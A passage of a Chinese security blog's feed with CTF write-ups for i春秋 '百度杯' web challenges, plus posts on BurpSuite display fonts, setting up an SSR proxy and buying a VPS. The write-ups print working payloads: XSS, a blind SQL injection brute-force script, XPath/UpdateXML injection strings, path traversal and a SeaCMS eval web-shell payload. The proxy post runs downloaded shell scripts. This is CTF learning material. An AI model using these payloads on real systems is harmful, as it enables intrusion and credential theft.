</figure></p><p>这题做了处理，不能用简单的<code>alert</code>来弹窗，但是也有其他方法，<br>payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">URL?id=\u003cimg%20src=1%20onerror=alert(_key_)\u003e;</span><br></pre></td></tr></table></figure></p><p>得到flag</p><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Web&quot;&gt;&lt;a href=&quot;#Web&quot; class=&quot;headerlink&quot; title=&quot;Web&quot;&gt;&lt;/a&gt;Web&lt;/h1&gt;&lt;h2 id=&quot;web2&quot;&gt;&lt;a href=&quot;#web2&quot; class=&quot;headerlink&quot; title=&quot;web2&quot;&gt;&lt;/a&gt;web
      
    
    </summary>
    
      <category term="writeup" scheme="http://yoursite.com/categories/writeup/"/>
    
    
  </entry>
  
  <entry>
    <title>“百度杯”CTF比赛 登陆 writeup</title>
    <link href="http://yoursite.com/2018/05/31/logindft/"/>
    <id>http://yoursite.com/2018/05/31/logindft/</id>
    <published>2018-05-31T11:17:46.000Z</published>
    <updated>2018-05-31T11:22:04.986Z</updated>
    
    <content type="html"><![CDATA[<p>打开页面是一个登陆框:<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-31/31511072.jpg" alt="" title="" class="">                <p></p>            </figure></p><p>查看源代码：<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-31/74624348.jpg" alt="" title="" class="">                <p></p>            </figure></p><p>什么都发现不了，<br>但是这个表单中用户名密码的<code>class</code>有点奇怪，先记着</p><p>随便输入用户名和密码<br>同时打开burpsuite抓包：<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-31/49866720.jpg" alt="" title="" class="">                <p></p>            </figure></p><p>用万能密码试试：<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-31/81470936.jpg" alt="" title="" class="">                <p></p>            </figure></p><p>提示密码错误，但是当提交<code>or &#39;1&#39; = &#39;2</code>时，显示的是：<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-31/31785022.jpg" alt="" title="" class="">                <p></p>            </figure></p><p>猜测是个布尔型的盲注</p><p>试了很多函数不行，最后看的wp，用的是正则表达式：<br>username=<figure class="highlight plain"><figcaption><span>or user() regexp '^a' %23```</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">我们用burpsuite进行盲注：</span><br><span class="line">![](http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-31/59736271.jpg)</span><br><span class="line"></span><br><span class="line">然后字典选择`a~z,0~9,(),_`</span><br><span class="line">用的都是表的常用字符,然后开始爆破：</span><br><span class="line">![](http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-31/66273786.jpg)</span><br><span class="line"></span><br><span class="line">可以知道第一位是`u`，</span><br><span class="line">一直持续下去可以发现这个列的名字就是前面表单用户名的`class`</span><br><span class="line">然后密码也是，就不仔细说了，</span><br><span class="line">接下来爆列:</span><br><span class="line">将`user()`替换成`user_n3me`：</span><br><span class="line">![](http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-31/46135022.jpg)</span><br><span class="line"></span><br><span class="line">继续爆破：</span><br><span class="line">![](http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-31/42315072.jpg)</span><br><span class="line"></span><br><span class="line">可以知道第一位是b，重复这个过程就行了</span><br><span class="line">最终得到</span><br><span class="line">用户名：`bctf3dm1n`密码：`2bfb1532857ddc0033fdae5bde3facdf`</span><br><span class="line">md5解密之后是:`adminqwe123666`</span><br><span class="line"></span><br><span class="line">一个个爆破可以比较麻烦，这里给出c26大佬的py脚本：</span><br></pre></td></tr></table></figure></p><p>import string<br>import requests</p><p>url = ‘<a href="http://6990a7a5194048468ddd58ba76d76945610fd134a3ad4269.game.ichunqiu.com/Challenges/login.php&#39;" target="_blank" rel="noopener">http://6990a7a5194048468ddd58ba76d76945610fd134a3ad4269.game.ichunqiu.com/Challenges/login.php&#39;</a><br>headers = {‘User-Agent’: “Mozilla/5.0 (X11; Linux x86_64; rv:18.0) Gecko/20100101 Firefox/18.0”}<br>payloads = string.ascii_letters + string.digits<br>temp = ‘’<br>for i in range(40):<br>    print(“the”+str(i)+”one”)<br>    for p in payloads:<br>        payload = temp + p<br>        name = “admin’ or user_n3me like ‘{}%’ ;#”.format(payload)<br>        data = dict(username=name, passwrod=’test’)<br>        res = requests.post(url, headers=headers, data=data)<br>        if (len(res.content) == 12):<br>            temp = temp + p<br>            print(temp.ljust(32, ‘.’))<br>            break<br><code>`</code><br>换url和列名就行。</p><p>登陆进去之后是这个页面：<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-31/83153689.jpg" alt="" title="" class="">                <p></p>            </figure></p><p>那个.bctfg1t看起来像个.git文件，试了一下：<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-31/205237.jpg" alt="" title="" class="">                <p></p>            </figure></p><p>果然是个.git文件，githack跑完之后：<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-31/25792402.jpg" alt="" title="" class="">                <p></p>            </figure></p><p>接下来很明显就是还原版本了，<br><code>git cat-file -p 哈希</code><br>一直到a1开头的哈希：<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-31/74666070.jpg" alt="" title="" class="">                <p></p>            </figure></p><p>出来一个文件名,我们访问他：<br>得到flag：<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-31/79811599.jpg" alt="" title="" class="">                <p></p>            </figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;打开页面是一个登陆框:&lt;br&gt;&lt;figure class=&quot;image-box&quot;&gt;
                &lt;img src=&quot;http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-31/31511072.jpg&quot; al
      
    
    </summary>
    
      <category term="writeup" scheme="http://yoursite.com/categories/writeup/"/>
    
    
      <category term=".git泄露" scheme="http://yoursite.com/tags/git%E6%B3%84%E9%9C%B2/"/>
    
      <category term="sql注入" scheme="http://yoursite.com/tags/sql%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>解决burpsuite里中文不显示的方法</title>
    <link href="http://yoursite.com/2018/05/31/bp/"/>
    <id>http://yoursite.com/2018/05/31/bp/</id>
    <published>2018-05-31T09:12:12.000Z</published>
    <updated>2018-05-31T09:15:12.434Z</updated>
    
    <content type="html"><![CDATA[<p>burpsuite中文显示不出，某些时候非常不好用</p><p>这里用的版本是1.7.26，其他的版本修改方式没有大的区别</p><p>打开burpsuite，找到<code>user options</code>:<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-31/43899203.jpg" alt="" title="" class="">                <p></p>            </figure></p><p>然后在display中的http message display选择成中文字体，<br>这里选择微软雅黑：<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-31/64155627.jpg" alt="" title="" class="">                <p></p>            </figure></p><p>然后就成功了</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;burpsuite中文显示不出，某些时候非常不好用&lt;/p&gt;
&lt;p&gt;这里用的版本是1.7.26，其他的版本修改方式没有大的区别&lt;/p&gt;
&lt;p&gt;打开burpsuite，找到&lt;code&gt;user options&lt;/code&gt;:&lt;br&gt;&lt;figure class=&quot;image-bo
      
    
    </summary>
    
      <category term="技术分享" scheme="http://yoursite.com/categories/%E6%8A%80%E6%9C%AF%E5%88%86%E4%BA%AB/"/>
    
    
      <category term="burpsuite" scheme="http://yoursite.com/tags/burpsuite/"/>
    
  </entry>
  
  <entry>
    <title>i春秋 &quot;百度杯&quot; 九月场 123 writeup</title>
    <link href="http://yoursite.com/2018/05/28/123/"/>
    <id>http://yoursite.com/2018/05/28/123/</id>
    <published>2018-05-28T04:09:58.000Z</published>
    <updated>2018-05-30T11:47:43.241Z</updated>
    
    <content type="html"><![CDATA[<p>打开是个登陆界面：<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-28/25548456.jpg" alt="" title="" class="">                <p></p>            </figure></p><p>查看一下源代码：<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-28/89077544.jpg" alt="" title="" class="">                <p></p>            </figure></p><p>用户信息都在<code>user.php</code>里，<br>密码的结构也告诉你了，猜想是爆破<br>但是现在没有字典，<br>我们先访问一下<code>user.php</code>，发现啥都没有，<br>一开始以为是文件包含，但是没有变量可以用<br>可能是备份文件获取，试试<code>user.php.bak</code><br>果然：<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-28/71911141.jpg" alt="" title="" class="">                <p></p>            </figure></p><p>将文件下载下来之后发现是用户名的信息，<br>打开burpsuite开始爆破：<br>从1990年开始（大佬们wp写的，我也不知道为什么）<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-28/70641293.jpg" alt="" title="" class="">                <p></p>            </figure></p><p>字典直接用刚刚的user.php<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-28/50813700.jpg" alt="" title="" class="">                <p></p>            </figure></p><p>开始爆破：<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-28/2436984.jpg" alt="" title="" class="">                <p></p>            </figure></p><p>得到了一个用户<code>lixiuyun</code> 密码 <code>lixiuyun1990</code></p><p>登陆进去之后也是什么都没有，查看源代码：<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-28/84033226.jpg" alt="" title="" class="">                <p></p>            </figure></p><p>本地构建html：<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-28/68268069.jpg" alt="" title="" class="">                <p></p>            </figure></p><p>php别名：php2, php3, php4, php5, phps, pht, phtm, phtml …<br>都可以试试:<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-28/2201720.jpg" alt="" title="" class="">                <p></p>            </figure></p><p>可以看到有个view.php了，打开看看<br>这次估计真是文件包含了：<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-28/3508568.jpg" alt="" title="" class="">                <p></p>            </figure></p><p>这里还有个过滤，将flag过滤了<br>双写flag即可拿到flag：<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-28/23475809.jpg" alt="" title="" class="">                <p></p>            </figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;打开是个登陆界面：&lt;br&gt;&lt;figure class=&quot;image-box&quot;&gt;
                &lt;img src=&quot;http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-28/25548456.jpg&quot; alt=
      
    
    </summary>
    
      <category term="writeup" scheme="http://yoursite.com/categories/writeup/"/>
    
    
      <category term="爆破" scheme="http://yoursite.com/tags/%E7%88%86%E7%A0%B4/"/>
    
      <category term="备份文件获取" scheme="http://yoursite.com/tags/%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6%E8%8E%B7%E5%8F%96/"/>
    
      <category term="文件上传" scheme="http://yoursite.com/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    
  </entry>
  
  <entry>
    <title>i春秋 &quot;百度杯&quot; 九月场 Yeser writeup</title>
    <link href="http://yoursite.com/2018/05/28/YeserCMS/"/>
    <id>http://yoursite.com/2018/05/28/YeserCMS/</id>
    <published>2018-05-28T01:27:26.000Z</published>
    <updated>2018-05-30T11:55:22.336Z</updated>
    
    <content type="html"><![CDATA[<p>打开来是一个不知道什么cms的页面：<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-28/45802196.jpg" alt="" title="" class="">                <p></p>            </figure></p><p>上cms指纹识别：<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-28/67711801.jpg" alt="" title="" class="">                <p></p>            </figure></p><p>但是貌似识别不出来，想想其他方法<br>比如搜一搜传递的变量名，也就是URL后面跟着的一大堆东西<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-28/47690650.jpg" alt="" title="" class="">                <p></p>            </figure></p><p>点进去看了看，跟题目的cms差不多<br>差不多确定是easycms了，搜一搜easycms漏洞<br>但是找到的大多数不能用，<br>最终还是看了大佬们写的writeup<br>在<code>URL/celive/live/header.php</code><br>处有一个xpath注入漏洞<a href="http://www.91ri.org/7147.html" target="_blank" rel="noopener">xpath注入科普</a><br>payload：<br>第一段：</p><p><code>xajax=Postdata&amp;xajaxargs[0]=<xjxquery><br><q>detail=xxxxxx%2527%252C%2528UpdateXML%25281%252CCONCAT%25280x5b%252Cmid%2528%2528SELECT%252f%252a%252a%252fGROUP_CONCAT%2528concat %2528username%252C%2527%257C%2527%252Cpassword %2529%2529%2520from%2520yesercms_user %2529%252C1%252C32%2529%252C0x5d %2529%252C1%2529%2529%252CNULL%252CNULL%252CNULL%252CNULL%252CNULL%252CNULL%2529–%2520</q></xjxquery><br></code></p><p>第二段：</p><p><code>xajax=Postdata&amp;xajaxargs[0]=<xjxquery><br><q>detail=xxxxxx%2527%252C%2528UpdateXML%25281%252CCONCAT%25280x5b%252Cmid%2528%2528SELECT%252f%252a%252a%252fGROUP_CONCAT%2528concat %2528username%252C%2527%257C%2527%252Cpassword %2529%2529%2520from%2520yesercms_user %2529%252C10%252C32%2529%252C0x5d %2529%252C1%2529%2529%252CNULL%252CNULL%252CNULL%252CNULL%252CNULL%252CNULL%2529–%2520</q></xjxquery><br></code><br>这里得分成两段显示：</p><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-28/51587652.jpg" alt="" title="" class="">                <p></p>            </figure><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-28/60060206.jpg" alt="" title="" class="">                <p></p>            </figure><p>得到管理员的账户是<code>admin</code><br>密码是md5加密的<code>Yeser231</code><br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-28/22571721.jpg" alt="" title="" class="">                <p></p>            </figure></p><p>登陆后台：<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-28/1821806.jpg" alt="" title="" class="">                <p></p>            </figure></p><p>找地方上传shell，自己找了很久没有找到地方，最后还是看的大佬的wp<br>在模版-&gt;当前模版编辑处<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-28/62323393.jpg" alt="" title="" class="">                <p></p>            </figure></p><p>点击编辑，这个时候会把这个文件名传进去，<br>然后再显示出来这个文件的内容：<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-28/78331668.jpg" alt="" title="" class="">                <p></p>            </figure></p><p>这个时候直接看到提示：<code>flag在网站根目录下的flag.php中</code><br>把id换成<br><code>../../flag.php</code><br>即可得到flag:<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-28/47210201.jpg" alt="" title="" class="">                <p></p>            </figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;打开来是一个不知道什么cms的页面：&lt;br&gt;&lt;figure class=&quot;image-box&quot;&gt;
                &lt;img src=&quot;http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-28/45802196.
      
    
    </summary>
    
      <category term="writeup" scheme="http://yoursite.com/categories/writeup/"/>
    
    
      <category term="命令执行" scheme="http://yoursite.com/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    
      <category term="xpath注入" scheme="http://yoursite.com/tags/xpath%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>i春秋 &quot;百度杯&quot; 九月场 Test writeup</title>
    <link href="http://yoursite.com/2018/05/28/test/"/>
    <id>http://yoursite.com/2018/05/28/test/</id>
    <published>2018-05-28T01:27:13.000Z</published>
    <updated>2018-05-30T11:54:23.066Z</updated>
    
    <content type="html"><![CDATA[<p>首先打开题目：<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-28/34916792.jpg" alt="" title="" class="">                <p></p>            </figure></p><p>发现是一个海洋CMS，但是不太清楚版本<br>往下翻一翻，发现有个年份<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-28/41559037.jpg" alt="" title="" class="">                <p></p>            </figure></p><p>看得出是一个很老的版本了，题目的提示是：<br><code>善于查资料，你就可以拿一血了</code><br>好吧直接查资料：<br><code>海洋cms漏洞利用</code><br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-28/41559037.jpg" alt="" title="" class="">                <p></p>            </figure></p><p>直接一大块的漏洞出来了。<br>这里直接找到payload了：<br><code>/search.php?searchtype=5&amp;tid=&amp;area=eval($_POST[cmd])</code></p><p>然后打开菜刀：<br>密码<code>cmd</code>连接即可：<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-28/90521376.jpg" alt="" title="" class="">                <p></p>            </figure></p><p>连接成功：<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-28/9609352.jpg" alt="" title="" class="">                <p></p>            </figure></p><p>可以发现在html/data下有个common.inc.php<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-28/36892120.jpg" alt="" title="" class="">                <p></p>            </figure></p><p>这个是数据库的配置文件</p><p>菜刀连接数据库拿到flag:<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-28/6211372.jpg" alt="" title="" class="">                <p></p>            </figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;首先打开题目：&lt;br&gt;&lt;figure class=&quot;image-box&quot;&gt;
                &lt;img src=&quot;http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-28/34916792.jpg&quot; alt=&quot;&quot;
      
    
    </summary>
    
      <category term="writeup" scheme="http://yoursite.com/categories/writeup/"/>
    
    
      <category term="sql注入" scheme="http://yoursite.com/tags/sql%E6%B3%A8%E5%85%A5/"/>
    
      <category term="命令执行" scheme="http://yoursite.com/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    
  </entry>
  
  <entry>
    <title>Centos6&amp;7 搭建ssr科学上网及IPv6免流</title>
    <link href="http://yoursite.com/2018/05/27/ssr/"/>
    <id>http://yoursite.com/2018/05/27/ssr/</id>
    <published>2018-05-27T01:31:22.000Z</published>
    <updated>2018-05-30T11:53:44.849Z</updated>
    
    <content type="html"><![CDATA[<h3 id="1-购买vps"><a href="#1-购买vps" class="headerlink" title="1.购买vps"></a>1.购买vps</h3><p>这里给出<a href="https://cherrygk.github.io/2018/05/27/vps/" target="_blank" rel="noopener">链接</a>，就不仔细介绍了</p><h3 id="2-搭建ssr"><a href="#2-搭建ssr" class="headerlink" title="2.搭建ssr"></a>2.搭建ssr</h3><p>连接上xshell或者其他shell软件之后，复制以下命令：<br><code>wget -N <a href="https://raw.githubusercontent.com/ToyoDAdoubi/doubi/master/ssr.sh" target="_blank" rel="noopener">https://raw.githubusercontent.com/ToyoDAdoubi/doubi/master/ssr.sh</a><br>chmod +x ssr.sh<br>bash ssr.sh<br></code><br>一条一条命令执行即可，执行完之后看到的是这个页面：<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-27/30188874.jpg" alt="" title="" class="">                <p></p>            </figure></p><p>选择1安装ssr，将端口号设置成443，密码写个自己能记住的密码：<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-27/35840001.jpg" alt="" title="" class="">                <p></p>            </figure></p><p>加密方式选择<code>10. aes-256-cfb</code><br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-27/38496608.jpg" alt="" title="" class="">                <p></p>            </figure></p><p>协议插件和混淆插件分别选择：<br><code>2.auth_sha1_v4和tls1.2_ticket_auth</code></p><p>询问<code>是否兼容原版</code>，原版就是ss，这里选择no，<br>选择yes的话就能支持ss客户端了：<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-27/55693970.jpg" alt="" title="" class="">                <p></p>            </figure></p><p>限制的设备数、单线程限速上限、每个端口的总速度，这里都直接回车，选择默认（不限速）：<br>(这里自用，所以没有限速和限流)<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-27/42615922.jpg" alt="" title="" class="">                <p></p>            </figure></p><p>回车之后就可以开始安装了：<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-27/52424243.jpg" alt="" title="" class="">                <p></p>            </figure></p><p>出来这个页面的话，证明已经安装完成了，<br>如果嫌麻烦的话，这样已经可以直接用了，<br>但是如果你想<code>多端口配置</code>也是可以的,<br>输入:<br><code>bash ssr.sh</code><br>进入ssr的管理页面,<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-27/73282461.jpg" alt="" title="" class="">                <p></p>            </figure></p><p>如果之前的步骤有些小问题的话这里也是可以修改的，<br>现在我们需要切换成<code>多端口模式</code>：<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-27/42295513.jpg" alt="" title="" class="">                <p></p>            </figure></p><p>配置跟之前的单端口一样就行，设置成功后：<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-27/41616348.jpg" alt="" title="" class="">                <p></p>            </figure></p><p>直接就有一个端口，这个端口是之前单端口设置的，<br>进入管理页面：<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-27/34687472.jpg" alt="" title="" class="">                <p></p>            </figure></p><p>多端口模式下<code>7.用户配置</code>可以添加新的端口：<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-27/43110869.jpg" alt="" title="" class="">                <p></p>            </figure></p><p>操作跟之前一样，配置成功后：<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-27/21970127.jpg" alt="" title="" class="">                <p></p>            </figure></p><h3 id="3-客户端的安装"><a href="#3-客户端的安装" class="headerlink" title="3.客户端的安装"></a>3.客户端的安装</h3><p>Windows：<br><code><a href="https://nofile.io/f/6Jm7WJCyOVv/ShadowsocksR-4.7.0-win.7z" target="_blank" rel="noopener">https://nofile.io/f/6Jm7WJCyOVv/ShadowsocksR-4.7.0-win.7z</a></code><br>安卓：<br><code><a href="https://nofile.io/f/rvTJoj0h5GC/shadowsocksr-release.apk" target="_blank" rel="noopener">https://nofile.io/f/rvTJoj0h5GC/shadowsocksr-release.apk</a></code></p><p>windows版解压完之后直接运行：<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-27/31371154.jpg" alt="" title="" class="">                <p></p>            </figure></p><p>任务栏会出现一个小飞机：<br>首先我们把前面ssr的链接复制下来，然后右键小飞机，选择剪贴板导入即可。</p><p>安卓的比较简单，就不仔细截图了。<br>首先将APK安装-&gt;然后点击顶上方的“▼”-&gt;选择右下方的“+”<br>-&gt;从剪切板导入即可(同样得复制之前的ssr链接)</p><h3 id="4-bbr加速"><a href="#4-bbr加速" class="headerlink" title="4.bbr加速"></a>4.bbr加速</h3><p>这一步主要是给自己的ssr提速<br>复制以下命令到shell里:</p><pre>yum -y install wgetwget --no-check-certificate https://github.com/teddysun/across/raw/master/bbr.shchmod +x bbr.sh./bbr.sh</pre><p>安装完之后会提示你是否重启，选择y<br>然后就能正常使用了。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;1-购买vps&quot;&gt;&lt;a href=&quot;#1-购买vps&quot; class=&quot;headerlink&quot; title=&quot;1.购买vps&quot;&gt;&lt;/a&gt;1.购买vps&lt;/h3&gt;&lt;p&gt;这里给出&lt;a href=&quot;https://cherrygk.github.io/2018/05/27
      
    
    </summary>
    
      <category term="技术分享" scheme="http://yoursite.com/categories/%E6%8A%80%E6%9C%AF%E5%88%86%E4%BA%AB/"/>
    
    
      <category term="免流" scheme="http://yoursite.com/tags/%E5%85%8D%E6%B5%81/"/>
    
      <category term="科学上网" scheme="http://yoursite.com/tags/%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>VPS的选择及购买</title>
    <link href="http://yoursite.com/2018/05/27/vps/"/>
    <id>http://yoursite.com/2018/05/27/vps/</id>
    <published>2018-05-27T01:27:02.000Z</published>
    <updated>2018-05-30T11:54:01.058Z</updated>
    
    <content type="html"><![CDATA[<p>这里主要讲述Vutrl的使用，搬瓦工也是可以的（因为都支持支付宝，简单快捷）</p><h3 id="注册Vultr"><a href="#注册Vultr" class="headerlink" title="注册Vultr"></a>注册Vultr</h3><p>打开<a href="https://www.vultr.com/?ref=7382462" target="_blank" rel="noopener">注册链接</a><br>点击右上方的Create Account<br>注册比较简单，输入邮箱密码创建就行<br>进入邮箱确认，登陆后：<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-27/87688976.jpg" alt="" title="" class="">                <p></p>            </figure></p><h3 id="充值"><a href="#充值" class="headerlink" title="充值"></a>充值</h3><p>点击<code>Billing</code>,然后点击<code>Make Payment</code>下的<code>Alipay</code><br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-27/73845292.jpg" alt="" title="" class="">                <p></p>            </figure></p><p>选择价格然后充值，第一次使用少充点，10美元就行<br>觉得好用再继续充值就行，<br>然后会跳转到支付宝的支付页面，用支付宝付款即可</p><h3 id="添加服务器"><a href="#添加服务器" class="headerlink" title="添加服务器"></a>添加服务器</h3><p>点击左侧的Servers<br>可以看到右边有个“+”号：<br>点击之后，这个页面是选择地区<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-27/9681133.jpg" alt="" title="" class="">                <p></p>            </figure></p><p>在国内的话最好选择日本的服务器<br>速度最快<br>可以选择其他地区的比如纽约，洛杉矶，速度也不慢<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-27/35259126.jpg" alt="" title="" class="">                <p></p>            </figure></p><p>选择系统类型，这里选择centos6，<br>因为centos7的防火墙可能会导致ssr的一些服务不能用<br>价格选择，当然是越贵越好了，但是这个好只是体现在连接的人数<br>个人用的话选择最便宜的就行了。<br>下方勾选Enable IPv6，需要IPv6免流的可以勾上<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-27/71161788.jpg" alt="" title="" class="">                <p></p>            </figure></p><p>然后直接Deploy Now即可</p><p>这里附上一种测速方法：</p><pre>使用ping命令：vutrl一开始最多可以创建5个VPS创建完之后拿ping命令去试试速度win+r 输入cmd在控制台输入：ping 你的服务器IP看看延迟就行，延迟越低速度越快如果速度很慢的话把这个服务器删掉就行（创建5分钟之内不能消除）</pre><h3 id="连接服务器"><a href="#连接服务器" class="headerlink" title="连接服务器"></a>连接服务器</h3><p>回到Servers页面<br>点击刚刚创建的服务器<br>这里的IP和密码待会得用到<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-27/768601.jpg" alt="" title="" class="">                <p></p>            </figure></p><p>这里有服务器的ssh<br>我们需要使用shell软件来连接他<br>这里演示的是xshell：<br>从网上直接下载xshell就可以使用：<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-27/45907955.jpg" alt="" title="" class="">                <p></p>            </figure></p><p>点击文件，新建<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-27/44226464.jpg" alt="" title="" class="">                <p></p>            </figure></p><p>名称随便写个就行，主机处填写你服务器的IP<br>然后点击左边的用户身份验证<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-27/14476746.jpg" alt="" title="" class="">                <p></p>            </figure></p><p>用户名写root，密码从刚刚那个页面复制下来，<br>然后点击连接就行<br>出现这个页面就代表连接成功了:<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-27/88630009.jpg" alt="" title="" class="">                <p></p>            </figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;这里主要讲述Vutrl的使用，搬瓦工也是可以的（因为都支持支付宝，简单快捷）&lt;/p&gt;
